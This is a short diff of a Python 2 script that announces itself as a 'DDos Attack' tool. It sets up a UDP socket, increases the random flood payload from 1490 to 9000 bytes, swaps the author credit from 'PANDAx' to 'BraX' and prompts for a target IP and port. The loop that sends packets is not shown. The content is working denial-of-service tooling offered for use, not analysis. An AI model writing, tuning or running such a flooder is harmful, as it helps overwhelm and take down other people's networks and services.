@@ -14,26 +14,15 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+bytes = random._urandom(9000)
 #############
 
 os.system("clear")
 os.system("figlet DDos Attack")
-print(""" X              X
-         X  X          X  X
-          X  X        X  X
-           X  X      X  X      
-            X  XXXXXX  X
-              X      X
-             X  ฿  ฿  X
-            X          X
-             X   B    X 
-              X  ¿   X
-               X    X
-                XXXX
-                
-Author   : PANDAx
-Facebook : https://m.facebook.com/J.cknew""")
+print
+print "Author   : BraX"
+print "Facebook : https://m.facebook.com/J.cknew"
+print
 
 ip = raw_input("IP : ")
 port = input("Port : ")
